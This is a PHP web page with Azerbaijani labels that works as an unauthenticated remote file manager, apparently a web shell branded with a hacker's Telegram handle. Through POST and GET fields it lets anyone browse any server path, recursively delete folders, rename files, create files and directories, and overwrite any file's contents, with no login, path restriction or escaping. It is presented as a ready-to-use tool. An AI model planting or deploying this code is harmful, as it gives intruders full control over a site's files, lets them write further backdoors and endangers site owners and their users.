<?php
// Verilmiş yol üzrə fayl və qovluqların siyahısını almaq üçün funksiya
function getFiles($path)
{
    $files = scandir($path);
    $fileList = [];

    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $filePath = $path . '/' . $file;
            $fileInfo = [
                'name' => $file,
                'path' => $filePath,
                'type' => is_dir($filePath) ? 'qovluq' : 'fayl',
            ];
            array_push($fileList, $fileInfo);
        }
    }

    return $fileList;
}

// Fayl və ya qovluğu silmək üçün funksiya
function deleteFile($path)
{
    if (is_file($path)) {
        return unlink($path);
    } elseif (is_dir($path)) {
        $files = array_diff(scandir($path), array('.', '..'));

        foreach ($files as $file) {
            deleteFile($path . '/' . $file);
        }

        return rmdir($path);
    }

    return false;
}

// Fayl və ya qovluğun adını dəyişdirmək üçün funksiya
function renameFile($oldPath, $newPath)
{
    return rename($oldPath, $newPath);
}

// Yeni fayl yaratmaq üçün funksiya
function createFile($path, $filename)
{
    $filePath = $path . '/' . $filename;
    return touch($filePath);
}

// Yeni qovluq yaratmaq üçün funksiya
function createDirectory($path, $dirname)
{
    $dirPath = $path . '/' . $dirname;
    return mkdir($dirPath);
}

// Faylı düzəltmək üçün funksiya
function editFile($filePath, $content)
{
    return file_put_contents($filePath, $content);
}


// Cari dizini almaq üçün funksiya
function getCurrentDirectory($path) {
    return realpath($path);
}

// Fayl idarəetmə əməliyyatlarını icra etmək üçün
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $path = isset($_POST['path']) ? $_POST['path'] : '';

    if ($action === 'getFiles') {
        // Verilmiş yoldakı fayl və qovluqları alın
        $fileList = getFiles($path);
        echo json_encode($fileList);
        exit; // Skriptin daha əlavə icrasını qarışdırmaq üçün əlavə edildi
    } elseif ($action === 'delete' && isset($_POST['deletePath'])) {
        // Fayl və ya qovluğu silmək
        $deletePath = $_POST['deletePath'];
        $success = deleteFile($deletePath);

        if ($success) {
            echo 'Fayl və ya qovluq uğurla silindi.';
        } else {
            echo 'Fayl və ya qovluq silmək mümkün olmadı.';
        }
        exit; // Skriptin daha əlavə icrasını qarışdırmaq üçün əlavə edildi
    } elseif ($action === 'rename' && isset($_POST['oldPath']) && isset($_POST['newPath'])) {
        // Fayl və ya qovluğun adını dəyişdirmək
        $oldPath = $_POST['oldPath'];
        $newPath = $_POST['newPath'];
        $success = renameFile($oldPath, $newPath);

        if ($success) {
            echo 'Fayl və ya qovluq uğurla adlandırıldı.';
        } else {
            echo 'Fayl və ya qovluq adını dəyişdirmək mümkün olmadı.';
        }
        exit; // Skriptin daha əlavə icrasını qarışdırmaq üçün əlavə edildi
    } elseif ($action === 'createFile' && isset($_POST['filename'])) {
        // Yeni fayl yaratmaq
        $filename = $_POST['filename'];
        $success = createFile($path, $filename);

        if ($success) {
            echo 'Fayl uğurla yaradıldı.';
        } else {
            echo 'Fayl yaratmaq mümkün olmadı.';
        }
        exit; // Skriptin daha əlavə icrasını qarışdırmaq üçün əlavə edildi
    } elseif ($action === 'createDirectory' && isset($_POST['dirname'])) {
        // Yeni qovluq yaratmaq
        $dirname = $_POST['dirname'];
        $success = createDirectory($path, $dirname);

        if ($success) {
            echo 'Qovluq uğurla yaradıldı.';
        } else {
            echo 'Qovluq yaratmaq mümkün olmadı.';
        }
        exit; // Skriptin daha əlavə icrasını qarışdırmaq üçün əlavə edildi
    } elseif ($action === 'editFile' && isset($_POST['filePath']) && isset($_POST['content'])) {
        // Faylı düzəltmək
        $filePath = $_POST['filePath'];
        $content = $_POST['content'];
        $success = editFile($filePath, $content);

        if ($success) {
            echo 'Fayl uğurla düzəldildi.';
        } else {
            echo 'Faylı düzəltmək mümkün olmadı.';
        }
        exit; // Skriptin daha əlavə icrasını qarışdırmaq üçün əlavə edildi
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Fayl İdarəçisi</title>
    <style>
       body {
    background-color: #121212;
    font-weight: bold;
    color: #e0e0e0;
    font-family: 'Marhey', sans-serif;
    margin: 0;
    padding: 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    min-height: 100vh;
    box-sizing: border-box;
}

h1 {
    color: #fdd835;
    margin: 20px 0;
    font-size: 2rem;
    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
}

ul.file-list {
    list-style: none;
    padding: 0;
    margin: 20px 0;
    width: 90%;
}

ul.file-list li {
    display: flex;
    align-items: center;
    justify-content: space-between;
    background-color: #1e1e1e;
    margin-bottom: 10px;
    padding: 10px;
    border-radius: 10px;
    box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.3);
}

ul.file-list li:hover {
    background-color: #333;
}

ul.file-list li img {
    width: 24px;
    height: 24px;
    margin-right: 10px;
}

ul.file-list li span.file-name {
    flex: 1;
    color: #e0e0e0;
    font-weight: bold;
}

.actions {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    width: 90%;
    margin-top: 20px;
}

.actions form {
    display: flex;
    flex-wrap: wrap;
    justify-content: space-between;
    margin-bottom: 15px;
    width: 100%;
}

.actions form input[type="text"],
.actions form textarea {
    width: 68%;
    margin-right: 10px;
    padding: 10px;
    border: none;
    border-radius: 10px;
    background-color: #2a2a2a;
    color: #e0e0e0;
}

.actions form input[type="submit"] {
    flex: 1;
    max-width: 120px;
    background-color: #8f0000;
    color: #fff;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    font-weight: bold;
}

.actions form input[type="submit"]:hover {
    background-color: #980000;
}

textarea {
    height: 80px;
}

@media (max-width: 768px) {
    ul.file-list li {
        flex-direction: column;
        align-items: flex-start;
    }

    ul.file-list li img {
        margin-bottom: 10px;
    }

    .actions form {
        flex-direction: column;
        align-items: flex-start;
    }

    .actions form input[type="text"],
    .actions form textarea,
    .actions form input[type="submit"] {
        width: 100%;
        margin: 5px 0;
    }
}
.r4m1l_background { position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; border-top-left-radius: 12px; opacity: 0.15; z-index: 1; pointer-events: none; }
.r4m1l_background:before { content: ''; position: absolute; top: 0; left: 0; bottom: 0; right: 0; background-image: linear-gradient(to top, transparent, rgba(0,0,0,0.54)); z-index: 0; }

    </style>
</head>
<body>
<div class="r4m1l_background"
style="background: url(https://i.imgur.com/Us6y1Th.gif)
center center / cover no-repeat;">
</div>

<td width="1" align="left">
        <nobr>
	<!--	<center><a href='https://t.me/r4m1l'  style="font-family: 'New Rocker'; font-size: 19px;">YeTiM</a></center><br> -->
          <a href="?"><br>
            <img src="https://i.imgur.com/4OIyQQe.png" style="width:98px;height:105px" alt="t.me/r4m1l">
          					</a>
        </nobr>
      </td>
<?php
if (!function_exists('getCurrentDirectory')) {
    function getCurrentDirectory($path) {
        return basename($path);
    }
}

$initialPath = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$ps = explode(DIRECTORY_SEPARATOR, $initialPath);
$currentPath = '';

echo '<strong>Yol:</strong>';
?>
<div style="display: flex; gap: 10px; flex-wrap: wrap;">
    <?php
    foreach ($ps as $p) {
        $currentPath .= ($currentPath ? DIRECTORY_SEPARATOR : '') . $p;
        echo '<a href="?path=' . urlencode($currentPath) . '" style="text-decoration: none; color: #007bff;">' . $p . '</a>';
    }
	    $fileList = getFiles($initialPath);

    ?>
</div>
    <ul class="file-list">
        <?php foreach ($fileList as $fileInfo) : ?>
            <li>
                <span class="file-icon">
                    <?php if ($fileInfo['type'] === 'qovluq') : ?>
                        <img src="https://img.icons8.com/color/48/000000/folder-invoices.png" alt="Qovluq İkonu">
                    <?php else : ?>
                        <img src="https://img.icons8.com/color/48/000000/file.png" alt="Fayl İkonu">
                    <?php endif; ?>
                </span>
                <span class="file-name">
                    <?php echo $fileInfo['name']; ?>
                </span>
                <?php if ($fileInfo['type'] === 'fayl') : ?>
                <?php endif; ?>
            </li>
        <?php endforeach; ?>
    </ul>

    <div class="actions">
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="delete">
            <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
            <input type="text" name="deletePath" placeholder="Silmək üçün fayl və ya qovluq" required>
            <input type="submit" value="Sil">
        </form>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
            <input type="text" name="oldPath" placeholder="Hazırkı fayl və ya qovluq yolu" required>
            <input type="text" name="newPath" placeholder="Yeni fayl və ya qovluq yolu" required>
            <input type="submit" value="Adını Dəyiş">
        </form>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="createFile">
            <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
            <input type="text" name="filename" placeholder="Yeni fayl adı" required>
            <input type="submit" value="Fayl Yarat">
        </form>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="createDirectory">
            <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
            <input type="text" name="dirname" placeholder="Yeni qovluq adı" required>
            <input type="submit" value="Qovluq Yarat">
        </form>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="editFile">
            <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
            <input type="text" name="filePath" placeholder="Düzəltmək üçün fayl yolu" required>
            <textarea name="content" placeholder="Faylın yeni məzmunu" required></textarea>
            <input type="submit" value="Faylı Düzəlt">
        </form>
    </div>
</body>
</html>
